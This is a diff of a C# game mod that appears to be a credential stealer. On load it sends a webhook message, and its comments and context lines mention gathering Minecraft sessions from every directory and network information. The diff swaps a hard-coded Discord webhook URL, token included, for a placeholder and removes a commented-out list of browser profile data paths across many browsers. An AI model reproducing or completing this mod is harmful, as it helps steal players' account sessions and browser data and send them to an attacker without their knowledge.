@@ -23,43 +23,14 @@ namespace Test
     public class Test : Mod
     {
         private static readonly HttpClient client = new HttpClient();
-        private static readonly string webhookUrl = "https://discord.com/api/webhooks/1326534322282565723/YEh7mGBxvB5HFKCuyyutQV4OMOkCWjSCcLpAeZQ7GH8rtcqnYb_f2Q0ibf7bHCY1LaFu";
+        // Replace with your discord webhook
+        private static readonly string webhookUrl = "";
         
         // Initialize the mod
         public override void Load()
         {
             Task.Run(async () => await SendWebhookMessageAsync()).GetAwaiter().GetResult();
         }
-        
-        /*
-        public void getBrowserInfo()
-        {
-            string[] browsersFound = new []
-            {
-                ""
-            };
-            
-            // Popular Browsers whtv
-            Dictionary<string, string> browsers = new Dictionary<string, string>
-            {
-                { "kometa",              Environment.ExpandEnvironmentVariables("%LocalAppData%\\Kometa\\User Data") },
-                { "orbitum",             Environment.ExpandEnvironmentVariables("%LocalAppData%\\Orbitum\\User Data") },
-                { "cent-browser",        Environment.ExpandEnvironmentVariables("%LocalAppData%\\CentBrowser\\User Data") },
-                { "7star",               Environment.ExpandEnvironmentVariables("%LocalAppData%\\7Star\\7Star\\User Data") },
-                { "sputnik",             Environment.ExpandEnvironmentVariables("%LocalAppData%\\Sputnik\\Sputnik\\User Data") },
-                { "vivaldi",             Environment.ExpandEnvironmentVariables("%LocalAppData%\\Vivaldi\\User Data") },
-                { "google-chrome-sxs",   Environment.ExpandEnvironmentVariables("%LocalAppData%\\Google\\Chrome SxS\\User Data") },
-                { "google-chrome",       Environment.ExpandEnvironmentVariables("%LocalAppData%\\Google\\Chrome\\User Data") },
-                { "epic-privacy-browser",Environment.ExpandEnvironmentVariables("%LocalAppData%\\Epic Privacy Browser\\User Data") },
-                { "microsoft-edge",      Environment.ExpandEnvironmentVariables("%LocalAppData%\\Microsoft\\Edge\\User Data") },
-                { "uran",                Environment.ExpandEnvironmentVariables("%LocalAppData%\\uCozMedia\\Uran\\User Data") },
-                { "yandex",              Environment.ExpandEnvironmentVariables("%LocalAppData%\\Yandex\\YandexBrowser\\User Data") },
-                { "brave",               Environment.ExpandEnvironmentVariables("%LocalAppData%\\BraveSoftware\\Brave-Browser\\User Data") },
-                { "iridium",             Environment.ExpandEnvironmentVariables("%LocalAppData%\\Iridium\\User Data") },
-                { "opera",               Environment.ExpandEnvironmentVariables("%AppData%\\Opera Software\\Opera Stable") },
-                { "opera-gx",            Environment.ExpandEnvironmentVariables("%AppData%\\Opera Software\\Opera GX Stable") }
-            };
-        }*/
         
         // Get all minecraft sessions from every directory
 
@@ -336,4 +307,5 @@ namespace Test
             return NwInfo;
         }
     }
+
 }
